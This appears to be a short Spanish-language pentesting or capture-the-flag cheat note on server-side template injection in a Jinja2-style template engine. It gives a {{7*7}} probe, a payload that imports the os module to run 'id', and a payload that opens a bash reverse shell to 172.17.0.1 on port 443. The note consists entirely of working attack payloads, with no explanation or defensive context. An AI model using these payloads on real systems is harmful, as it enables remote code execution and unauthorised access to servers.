Comprobamos si es vulnerable a SSTI

{{7*7}}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

REVERSE SHELL

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}

